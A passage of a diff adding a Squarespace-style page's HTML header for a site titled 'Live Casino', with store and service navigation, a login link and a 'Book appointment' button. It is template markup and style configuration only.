+      primary-button-style-solid primary-button-shape-pill secondary-button-style-solid secondary-button-shape-pill tertiary-button-style-solid tertiary-button-shape-pill  form-field-style-solid form-field-shape-square form-field-border-all form-field-checkbox-type-icon form-field-checkbox-fill-solid form-field-checkbox-color-inverted form-field-checkbox-shape-square form-field-checkbox-layout-stack form-field-radio-type-icon form-field-radio-fill-solid form-field-radio-color-normal form-field-radio-shape-pill form-field-radio-layout-stack form-field-survey-fill-solid form-field-survey-color-normal form-field-survey-shape-pill form-field-hover-focus-outline form-submit-button-style-label header-overlay-alignment-left header-width-inset tweak-transparent-header tweak-fixed-header tweak-fixed-header-style-basic tweak-blog-alternating-side-by-side-width-full tweak-blog-alternating-side-by-side-image-aspect-ratio-11-square tweak-blog-alternating-side-by-side-text-alignment-left tweak-blog-alternating-side-by-side-read-more-style-show tweak-blog-alternating-side-by-side-image-text-alignment-middle tweak-blog-alternating-side-by-side-delimiter-bullet tweak-blog-alternating-side-by-side-meta-position-top tweak-blog-alternating-side-by-side-primary-meta-categories tweak-blog-alternating-side-by-side-secondary-meta-date tweak-blog-alternating-side-by-side-excerpt-show tweak-blog-basic-grid-width-inset tweak-blog-basic-grid-image-aspect-ratio-43-four-three tweak-blog-basic-grid-text-alignment-left tweak-blog-basic-grid-delimiter-bullet tweak-blog-basic-grid-image-placement-above tweak-blog-basic-grid-read-more-style-hide tweak-blog-basic-grid-primary-meta-date tweak-blog-basic-grid-secondary-meta-categories tweak-blog-basic-grid-excerpt-hide tweak-blog-item-width-narrow tweak-blog-item-text-alignment-left tweak-blog-item-meta-position-below-title  tweak-blog-item-show-date tweak-blog-item-show-author-name  tweak-blog-item-delimiter-bullet tweak-blog-masonry-width-full tweak-blog-masonry-text-alignment-left tweak-blog-masonry-primary-meta-categories tweak-blog-masonry-secondary-meta-date tweak-blog-masonry-meta-position-top tweak-blog-masonry-read-more-style-show tweak-blog-masonry-delimiter-space tweak-blog-masonry-image-placement-above tweak-blog-masonry-excerpt-show tweak-blog-side-by-side-width-full tweak-blog-side-by-side-image-placement-left tweak-blog-side-by-side-image-aspect-ratio-11-square tweak-blog-side-by-side-primary-meta-categories tweak-blog-side-by-side-secondary-meta-date tweak-blog-side-by-side-meta-position-top tweak-blog-side-by-side-text-alignment-left tweak-blog-side-by-side-image-text-alignment-middle tweak-blog-side-by-side-read-more-style-show tweak-blog-side-by-side-delimiter-bullet tweak-blog-side-by-side-excerpt-show tweak-blog-single-column-width-full tweak-blog-single-column-text-alignment-center tweak-blog-single-column-image-placement-above tweak-blog-single-column-delimiter-bullet tweak-blog-single-column-read-more-style-show tweak-blog-single-column-primary-meta-none tweak-blog-single-column-secondary-meta-none tweak-blog-single-column-meta-position-top tweak-blog-single-column-content-full-post tweak-events-stacked-width-full tweak-events-stacked-height-large  tweak-events-stacked-show-thumbnails tweak-events-stacked-thumbnail-size-32-standard tweak-events-stacked-date-style-with-text tweak-events-stacked-show-time tweak-events-stacked-show-location  tweak-events-stacked-show-excerpt  tweak-global-animations-enabled tweak-global-animations-complexity-level-detailed tweak-global-animations-animation-style-fade tweak-global-animations-animation-type-fade tweak-global-animations-animation-curve-ease tweak-portfolio-grid-basic-width-full tweak-portfolio-grid-basic-height-large tweak-portfolio-grid-basic-image-aspect-ratio-11-square tweak-portfolio-grid-basic-text-alignment-left tweak-portfolio-grid-basic-hover-effect-fade tweak-portfolio-grid-overlay-width-full tweak-portfolio-grid-overlay-height-large tweak-portfolio-grid-overlay-image-aspect-ratio-11-square tweak-portfolio-grid-overlay-text-placement-center tweak-portfolio-grid-overlay-show-text-after-hover tweak-portfolio-index-background-link-format-stacked tweak-portfolio-index-background-width-full tweak-portfolio-index-background-height-large  tweak-portfolio-index-background-vertical-alignment-middle tweak-portfolio-index-background-horizontal-alignment-center tweak-portfolio-index-background-delimiter-none tweak-portfolio-index-background-animation-type-fade tweak-portfolio-index-background-animation-duration-medium tweak-portfolio-hover-follow-layout-inline  tweak-portfolio-hover-follow-delimiter-forward-slash tweak-portfolio-hover-follow-animation-type-fade tweak-portfolio-hover-follow-animation-duration-medium tweak-portfolio-hover-static-layout-stacked  tweak-portfolio-hover-static-delimiter-forward-slash tweak-portfolio-hover-static-animation-type-scale-up tweak-portfolio-hover-static-animation-duration-medium tweak-product-basic-item-product-variant-display-dropdown tweak-product-basic-item-product-subscription-display-radio tweak-product-basic-item-product-subscription-border-shape-square tweak-product-basic-item-width-inset tweak-product-basic-item-gallery-aspect-ratio-32-standard tweak-product-basic-item-text-alignment-center tweak-product-basic-item-navigation-none tweak-product-basic-item-description-position-below-price tweak-product-basic-item-description-position-mobile-below-add-to-cart-button tweak-product-basic-item-content-alignment-center tweak-product-basic-item-gallery-design-stacked tweak-product-basic-item-gallery-placement-left tweak-product-basic-item-thumbnail-placement-side tweak-product-basic-item-click-action-none tweak-product-basic-item-hover-action-none tweak-product-basic-item-variant-picker-layout-dropdowns tweak-product-basic-item-add-to-cart-standalone tweak-product-basic-item-add-to-cart-mobile-standalone tweak-products-width-inset tweak-products-image-aspect-ratio-32-standard tweak-products-text-alignment-middle  tweak-products-price-show tweak-products-nested-category-type-top  tweak-products-header-text-alignment-left tweak-products-breadcrumbs image-block-poster-text-alignment-center image-block-card-content-position-center image-block-card-text-alignment-left image-block-overlap-content-position-center image-block-overlap-text-alignment-left image-block-collage-content-position-center image-block-collage-text-alignment-center image-block-stack-text-alignment-left hide-opentable-icons opentable-style-dark tweak-product-quick-view-button-style-floating tweak-product-quick-view-button-position-bottom tweak-product-quick-view-lightbox-excerpt-display-truncate tweak-product-quick-view-lightbox-show-arrows tweak-product-quick-view-lightbox-show-close-button tweak-product-quick-view-lightbox-controls-weight-light native-currency-code-IDR collection-664218133d98d37de610c0e5 view-item collection-layout-default collection-type-products mobile-style-available sqs-seven-one
+      
+        show-pdp-subs-otp
+      
+      
+        pdp_subs_otp_buttons_enabled
+      
+      
+      
+        
+          
+          
+        
+      
+    "
+    tabindex="-1"
+  >
+    <div
+      id="siteWrapper"
+      class="clearfix site-wrapper"
+    >
+      
+        <div id="floatingCart" class="floating-cart hidden">
+          <a href="/cart" class="icon icon--stroke icon--fill icon--cart sqs-custom-cart">
+            <span class="Cart-inner">
+              
+
+
+
+  <svg class="icon icon--cart" width="61" height="49" viewBox="0 0 61 49">
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M0.5 2C0.5 1.17157 1.17157 0.5 2 0.5H13.6362C14.3878 0.5 15.0234 1.05632 15.123 1.80135L16.431 11.5916H59C59.5122 11.5916 59.989 11.8529 60.2645 12.2847C60.54 12.7165 60.5762 13.2591 60.3604 13.7236L50.182 35.632C49.9361 36.1614 49.4054 36.5 48.8217 36.5H18.0453C17.2937 36.5 16.6581 35.9437 16.5585 35.1987L12.3233 3.5H2C1.17157 3.5 0.5 2.82843 0.5 2ZM16.8319 14.5916L19.3582 33.5H47.8646L56.6491 14.5916H16.8319Z" />
+  <path d="M18.589 35H49.7083L60 13H16L18.589 35Z" />
+  <path d="M21 49C23.2091 49 25 47.2091 25 45C25 42.7909 23.2091 41 21 41C18.7909 41 17 42.7909 17 45C17 47.2091 18.7909 49 21 49Z" />
+  <path d="M45 49C47.2091 49 49 47.2091 49 45C49 42.7909 47.2091 41 45 41C42.7909 41 41 42.7909 41 45C41 47.2091 42.7909 49 45 49Z" />
+</svg>
+
+              <div class="legacy-cart icon-cart-quantity">
+                <span class="sqs-cart-quantity">0</span>
+              </div>
+            </span>
+          </a>
+        </div>
+      
+
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <header
+    data-test="header"
+    id="header"
+    
+    class="
+      
+        
+          
+        
+      
+      header theme-col--primary
+    "
+    data-section-theme=""
+    data-controller="Header"
+    data-current-styles="{
+&quot;layout&quot;: &quot;brandingCenter&quot;,
+&quot;action&quot;: {
+&quot;href&quot;: &quot;/book-appointment&quot;,
+&quot;buttonText&quot;: &quot;Book appointment&quot;,
+&quot;newWindow&quot;: false
+},
+&quot;showSocial&quot;: false,
+&quot;socialOptions&quot;: {
+&quot;socialBorderShape&quot;: &quot;none&quot;,
+&quot;socialBorderStyle&quot;: &quot;outline&quot;,
+&quot;socialBorderThickness&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 1.0
+}
+},
+&quot;sectionTheme&quot;: &quot;&quot;,
+&quot;menuOverlayTheme&quot;: &quot;dark-bold&quot;,
+&quot;menuOverlayAnimation&quot;: &quot;fade&quot;,
+&quot;cartStyle&quot;: &quot;cart&quot;,
+&quot;cartText&quot;: &quot;Cart&quot;,
+&quot;showEmptyCartState&quot;: true,
+&quot;cartOptions&quot;: {
+&quot;iconType&quot;: &quot;solid-7&quot;,
+&quot;cartBorderShape&quot;: &quot;none&quot;,
+&quot;cartBorderStyle&quot;: &quot;outline&quot;,
+&quot;cartBorderThickness&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 1.0
+}
+},
+&quot;showButton&quot;: true,
+&quot;showCart&quot;: false,
+&quot;showAccountLogin&quot;: true,
+&quot;headerStyle&quot;: &quot;dynamic&quot;,
+&quot;languagePicker&quot;: {
+&quot;enabled&quot;: false,
+&quot;iconEnabled&quot;: false,
+&quot;iconType&quot;: &quot;globe&quot;,
+&quot;flagShape&quot;: &quot;shiny&quot;,
+&quot;languageFlags&quot;: [ ]
+},
+&quot;mobileOptions&quot;: {
+&quot;layout&quot;: &quot;logoCenterNavLeft&quot;,
+&quot;menuIcon&quot;: &quot;tripleLineHamburger&quot;,
+&quot;menuIconOptions&quot;: {
+&quot;style&quot;: &quot;doubleLineHamburger&quot;,
+&quot;thickness&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 1.0
+}
+}
+},
+&quot;dynamicOptions&quot;: {
+&quot;border&quot;: {
+&quot;enabled&quot;: false,
+&quot;position&quot;: &quot;allSides&quot;,
+&quot;thickness&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 4.0
+},
+&quot;color&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+}
+},
+&quot;solidOptions&quot;: {
+&quot;headerOpacity&quot;: {
+&quot;unit&quot;: &quot;%&quot;,
+&quot;value&quot;: 100.0
+},
+&quot;border&quot;: {
+&quot;enabled&quot;: false,
+&quot;position&quot;: &quot;allSides&quot;,
+&quot;thickness&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 4.0
+},
+&quot;color&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+},
+&quot;dropShadow&quot;: {
+&quot;enabled&quot;: false,
+&quot;blur&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 30.0
+},
+&quot;spread&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 0.0
+},
+&quot;distance&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 0.0
+},
+&quot;color&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+},
+&quot;blurBackground&quot;: {
+&quot;enabled&quot;: false,
+&quot;blurRadius&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 12.0
+}
+},
+&quot;backgroundColor&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;white&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+},
+&quot;navigationColor&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+},
+&quot;gradientOptions&quot;: {
+&quot;gradientType&quot;: &quot;faded&quot;,
+&quot;headerOpacity&quot;: {
+&quot;unit&quot;: &quot;%&quot;,
+&quot;value&quot;: 90.0
+},
+&quot;border&quot;: {
+&quot;enabled&quot;: false,
+&quot;position&quot;: &quot;allSides&quot;,
+&quot;thickness&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 4.0
+},
+&quot;color&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+},
+&quot;dropShadow&quot;: {
+&quot;enabled&quot;: false,
+&quot;blur&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 30.0
+},
+&quot;spread&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 0.0
+},
+&quot;distance&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 0.0
+},
+&quot;color&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+},
+&quot;blurBackground&quot;: {
+&quot;enabled&quot;: false,
+&quot;blurRadius&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 12.0
+}
+},
+&quot;backgroundColor&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;white&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+},
+&quot;navigationColor&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+},
+&quot;dropShadowOptions&quot;: {
+&quot;enabled&quot;: false,
+&quot;blur&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 12.0
+},
+&quot;spread&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 0.0
+},
+&quot;distance&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 12.0
+}
+},
+&quot;borderOptions&quot;: {
+&quot;enabled&quot;: false,
+&quot;position&quot;: &quot;allSides&quot;,
+&quot;thickness&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 4.0
+},
+&quot;color&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+},
+&quot;showPromotedElement&quot;: false,
+&quot;buttonVariant&quot;: &quot;primary&quot;,
+&quot;blurBackground&quot;: {
+&quot;enabled&quot;: false,
+&quot;blurRadius&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 12.0
+}
+},
+&quot;headerOpacity&quot;: {
+&quot;unit&quot;: &quot;%&quot;,
+&quot;value&quot;: 100.0
+}
+}"
+    data-section-id="header"
+    data-header-style="dynamic"
+    data-language-picker="{
+&quot;enabled&quot;: false,
+&quot;iconEnabled&quot;: false,
+&quot;iconType&quot;: &quot;globe&quot;,
+&quot;flagShape&quot;: &quot;shiny&quot;,
+&quot;languageFlags&quot;: [ ]
+}"
+    
+    data-first-focusable-element
+    tabindex="-1"
+    style="
+      
+        
+        
+          --headerBorderColor: hsla(var(--black-hsl), 1);
+        
+      
+      
+        --solidHeaderBackgroundColor: hsla(var(--white-hsl), 1);
+      
+      
+        --solidHeaderNavigationColor: hsla(var(--black-hsl), 1);
+      
+      
+        --gradientHeaderBackgroundColor: hsla(var(--white-hsl), 1);
+      
+      
+        --gradientHeaderNavigationColor: hsla(var(--black-hsl), 1);
+      
+    "
+  >
+    
+<div class="sqs-announcement-bar-dropzone"></div>
+
+    <div class="header-announcement-bar-wrapper">
+      
+      <a
+        href="#page"
+        class="header-skip-link sqs-button-element--primary"
+      >
+        Skip to Content
+      </a>
+      
+
+
+<style>
+    @supports (-webkit-backdrop-filter: none) or (backdrop-filter: none) {
+        .header-blur-background {
+            
+            
+        }
+    }
+</style>
+      <div
+        class="header-border"
+        data-header-style="dynamic"
+        data-header-usability-enabled="true"
+        data-header-border="false"
+        data-test="header-border"
+        style="
+
+
+
+
+
+
+  
+    border-width: 0px !important;
+  
+
+
+
+  
+
+
+
+"
+      ></div>
+      <div
+        class="header-dropshadow"
+        data-header-style="dynamic"
+        data-header-usability-enabled="true"
+        data-header-dropshadow="false"
+        data-test="header-dropshadow"
+        style="
+
+
+  
+"
+      ></div>
+      
+      
+
+      <div class='header-inner container--fluid
+        
+        
+        
+        
+        
+        
+        
+         header-mobile-layout-logo-center-nav-left
+        
+        
+        
+        
+        
+         header-layout-branding-center
+        
+        
+        
+        
+        
+        '
+        style="
+
+
+
+
+
+
+  
+    padding: 0;
+  
+
+
+
+"
+        data-test="header-inner"
+        >
+        <!-- Background -->
+        <div class="header-background theme-bg--primary"></div>
+
+        <div class="header-display-desktop" data-content-field="site-title">
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+            
+            <!-- Social -->
+            
+          
+            
+            <!-- Title and nav wrapper -->
+            <div class="header-title-nav-wrapper">
+              
+
+              
+
+              
+                
+                <!-- Nav -->
+                <div class="header-nav">
+                  <div class="header-nav-wrapper">
+                    <nav class="header-nav-list">
+                      
+
+
+  
+    <div class="header-nav-item header-nav-item--collection header-nav-item--active">
+      <a
+        href="/store-2"
+        data-animation-role="header-element"
+        
+          aria-current="page"
+        
+      >
+        Store 2
+      </a>
+    </div>
+  
+  
+  
+
+
+  
+    <div class="header-nav-item header-nav-item--collection">
+      <a
+        href="/store-1-1"
+        data-animation-role="header-element"
+        
+      >
+        Store 1
+      </a>
+    </div>
+  
+  
+  
+
+
+  
+    <div class="header-nav-item header-nav-item--collection">
+      <a
+        href="/services"
+        data-animation-role="header-element"
+        
+      >
+        Services
+      </a>
+    </div>
+  
+  
+  
+
+
+  
+    <div class="header-nav-item header-nav-item--collection">
+      <a
+        href="/team"
+        data-animation-role="header-element"
+        
+      >
+        Team
+      </a>
+    </div>
+  
+  
+  
+
+
+  
+    <div class="header-nav-item header-nav-item--collection">
+      <a
+        href="/health-safety"
+        data-animation-role="header-element"
+        
+      >
+        Health &amp; Safety
+      </a>
+    </div>
+  
+  
+  
+
+
+
+                    </nav>
+                  </div>
+                </div>
+              
+                
+                <!-- Title -->
+                
+                  <div
+                    class="
+                      header-title
+                      
+                    "
+                    data-animation-role="header-element"
+                  >
+                    
+                      <div class="header-title-text">
+                        <a id="site-title" href="/" data-animation-role="header-element">Live Casino</a>
+                      </div>
+                    
+                    
+                  </div>
+                
+              
+              
+            </div>
+          
+            
+            <!-- Actions -->
+            <div class="header-actions header-actions--right">
+              
+                
+                  <div class="user-accounts-link header-nav-item header-nav-item--collection customerAccountLoginDesktop" data-controller="UserAccountLink" data-animation-role="header-element">
+                    <a class="user-accounts-text-link header-nav-item" href="#" data-animation-role="header-element">
+  <span class="unauth">Login</span>
+  <span class="auth">Account</span>
+</a>
+                  </div>
+                
+              
+              
+
+              
+
+            
+            
+
+              
+              <div class="showOnMobile">
+                
+              </div>
+
+              
+              <div class="showOnDesktop">
+                
+              </div>
+
+              
+                <div class="header-actions-action header-actions-action--cta" data-animation-role="header-element">
+                  <a
+                    class="btn btn--border theme-btn--primary-inverse sqs-button-element--primary"
+                    href="/book-appointment"
+                    
+                  >
+                    Book appointment
+                  </a>
+                </div>
+              
+            </div>
+          
+            
+
+
+<style>
+  .top-bun, 
+  .patty, 
+  .bottom-bun {
+    height: 1px;
+  }
+</style>
+
+<!-- Burger -->
+<div class="header-burger
+
+  menu-overlay-has-visible-non-navigation-items
+
+
+  
+" data-animation-role="header-element">
+  <button class="header-burger-btn burger" data-test="header-burger">
+    <span hidden class="js-header-burger-open-title visually-hidden">Open Menu</span>
+    <span hidden class="js-header-burger-close-title visually-hidden">Close Menu</span>
+    <div class="burger-box">
+      <div class="burger-inner header-menu-icon-doubleLineHamburger">
+        <div class="top-bun"></div>
+        <div class="patty"></div>
+        <div class="bottom-bun"></div>
+      </div>
+    </div>
+  </button>
+</div>
+
+          
+          
+          
+          
+          
+
+        </div>
+        <div class="header-display-mobile" data-content-field="site-title">
+          
+          
+          
+          
+            
+            <!-- Social -->
+            
+          
+            
+
+
+<style>
+  .top-bun, 
+  .patty, 
+  .bottom-bun {
+    height: 1px;
+  }
+</style>
+
+<!-- Burger -->
+<div class="header-burger
+
+  menu-overlay-has-visible-non-navigation-items
+
+
+  
+" data-animation-role="header-element">
+  <button class="header-burger-btn burger" data-test="header-burger">
+    <span hidden class="js-header-burger-open-title visually-hidden">Open Menu</span>
+    <span hidden class="js-header-burger-close-title visually-hidden">Close Menu</span>
+    <div class="burger-box">
+      <div class="burger-inner header-menu-icon-doubleLineHamburger">
+        <div class="top-bun"></div>
+        <div class="patty"></div>
+        <div class="bottom-bun"></div>
+      </div>
+    </div>
+  </button>
+</div>
+
+            
+            <!-- Title and nav wrapper -->
+            <div class="header-title-nav-wrapper">
+              
+
+              
+
+              
+                
+                <!-- Nav -->
+                <div class="header-nav">
+                  <div class="header-nav-wrapper">
+                    <nav class="header-nav-list">
+                      
+
+
+  
+    <div class="header-nav-item header-nav-item--collection header-nav-item--active">
+      <a
+        href="/store-2"
+        data-animation-role="header-element"
+        
+          aria-current="page"
+        
+      >
+        Store 2
+      </a>
+    </div>
+  
+  
+  
+
+
+  
+    <div class="header-nav-item header-nav-item--collection">
+      <a
+        href="/store-1-1"
+        data-animation-role="header-element"
+        
+      >
+        Store 1
+      </a>
+    </div>
+  
+  
+  
+
+
+  
+    <div class="header-nav-item header-nav-item--collection">
+      <a
+        href="/services"
+        data-animation-role="header-element"
+        
+      >
+        Services
+      </a>
+    </div>
+  
+  
+  
+
+
+  
+    <div class="header-nav-item header-nav-item--collection">
+      <a
+        href="/team"
+        data-animation-role="header-element"
+        
+      >
+        Team
+      </a>
+    </div>
+  
+  
+  
+
+
+  
+    <div class="header-nav-item header-nav-item--collection">
+      <a
+        href="/health-safety"
+        data-animation-role="header-element"
+        
+      >
+        Health &amp; Safety
+      </a>
+    </div>
+  
+  
+  
+
+
+
+                    </nav>
+                  </div>
+                </div>
+              
+                
+                <!-- Title -->
+                
+                  <div
+                    class="
+                      header-title
+                      
+                    "
+                    data-animation-role="header-element"
+                  >
+                    
+                      <div class="header-title-text">
+                        <a id="site-title" href="/" data-animation-role="header-element">Live Casino</a>
+                      </div>
+                    
+                    
+                  </div>
+                
+              
+              
+            </div>
+          
+            
+            <!-- Actions -->
+            <div class="header-actions header-actions--right">
+              
+                
+                  <div class="user-accounts-link header-nav-item header-nav-item--collection customerAccountLoginDesktop" data-controller="UserAccountLink" data-animation-role="header-element">
+                    <a class="user-accounts-text-link header-nav-item" href="#" data-animation-role="header-element">
+  <span class="unauth">Login</span>
+  <span class="auth">Account</span>
+</a>
+                  </div>
+                
+              
+              
+
+              
+
+            
+            
+
+              
+              <div class="showOnMobile">
+                
+              </div>
+
+              
+              <div class="showOnDesktop">
+                
+              </div><div class="header-actions-action header-actions-action--cta" data-animation-role="header-element">
+                  <a
+                    class="btn btn--border theme-btn--primary-inverse sqs-button-element--primary"
+                    href="/book-appointment"
+                    
+                  >
+                    Book appointment
+                  </a>
+                </div>
+              
+            </div>
+          
+          
+          
+        </div>
+      </div>
+    </div>
+    <!-- (Mobile) Menu Navigation -->
+    <div class="header-menu header-menu--folder-list
+      dark-bold
+      
+      
+      
+      
+      "
+      data-section-theme="dark-bold"
+      data-current-styles="{
+&quot;layout&quot;: &quot;brandingCenter&quot;,
+&quot;action&quot;: {
+&quot;href&quot;: &quot;/book-appointment&quot;,
+&quot;buttonText&quot;: &quot;Book appointment&quot;,
+&quot;newWindow&quot;: false
+},
+&quot;showSocial&quot;: false,
+&quot;socialOptions&quot;: {
+&quot;socialBorderShape&quot;: &quot;none&quot;,
+&quot;socialBorderStyle&quot;: &quot;outline&quot;,
+&quot;socialBorderThickness&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 1.0
+}
+},
+&quot;sectionTheme&quot;: &quot;&quot;,
+&quot;menuOverlayTheme&quot;: &quot;dark-bold&quot;,
+&quot;menuOverlayAnimation&quot;: &quot;fade&quot;,
+&quot;cartStyle&quot;: &quot;cart&quot;,
+&quot;cartText&quot;: &quot;Cart&quot;,
+&quot;showEmptyCartState&quot;: true,
+&quot;cartOptions&quot;: {
+&quot;iconType&quot;: &quot;solid-7&quot;,
+&quot;cartBorderShape&quot;: &quot;none&quot;,
+&quot;cartBorderStyle&quot;: &quot;outline&quot;,
+&quot;cartBorderThickness&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 1.0
+}
+},
+&quot;showButton&quot;: true,
+&quot;showCart&quot;: false,
+&quot;showAccountLogin&quot;: true,
+&quot;headerStyle&quot;: &quot;dynamic&quot;,
+&quot;languagePicker&quot;: {
+&quot;enabled&quot;: false,
+&quot;iconEnabled&quot;: false,
+&quot;iconType&quot;: &quot;globe&quot;,
+&quot;flagShape&quot;: &quot;shiny&quot;,
+&quot;languageFlags&quot;: [ ]
+},
+&quot;mobileOptions&quot;: {
+&quot;layout&quot;: &quot;logoCenterNavLeft&quot;,
+&quot;menuIcon&quot;: &quot;tripleLineHamburger&quot;,
+&quot;menuIconOptions&quot;: {
+&quot;style&quot;: &quot;doubleLineHamburger&quot;,
+&quot;thickness&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 1.0
+}
+}
+},
+&quot;dynamicOptions&quot;: {
+&quot;border&quot;: {
+&quot;enabled&quot;: false,
+&quot;position&quot;: &quot;allSides&quot;,
+&quot;thickness&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 4.0
+},
+&quot;color&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+}
+},
+&quot;solidOptions&quot;: {
+&quot;headerOpacity&quot;: {
+&quot;unit&quot;: &quot;%&quot;,
+&quot;value&quot;: 100.0
+},
+&quot;border&quot;: {
+&quot;enabled&quot;: false,
+&quot;position&quot;: &quot;allSides&quot;,
+&quot;thickness&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 4.0
+},
+&quot;color&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+},
+&quot;dropShadow&quot;: {
+&quot;enabled&quot;: false,
+&quot;blur&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 30.0
+},
+&quot;spread&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 0.0
+},
+&quot;distance&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 0.0
+},
+&quot;color&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+},
+&quot;blurBackground&quot;: {
+&quot;enabled&quot;: false,
+&quot;blurRadius&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 12.0
+}
+},
+&quot;backgroundColor&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;white&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+},
+&quot;navigationColor&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+},
+&quot;gradientOptions&quot;: {
+&quot;gradientType&quot;: &quot;faded&quot;,
+&quot;headerOpacity&quot;: {
+&quot;unit&quot;: &quot;%&quot;,
+&quot;value&quot;: 90.0
+},
+&quot;border&quot;: {
+&quot;enabled&quot;: false,
+&quot;position&quot;: &quot;allSides&quot;,
+&quot;thickness&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 4.0
+},
+&quot;color&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+},
+&quot;dropShadow&quot;: {
+&quot;enabled&quot;: false,
+&quot;blur&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 30.0
+},
+&quot;spread&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 0.0
+},
+&quot;distance&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 0.0
+},
+&quot;color&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
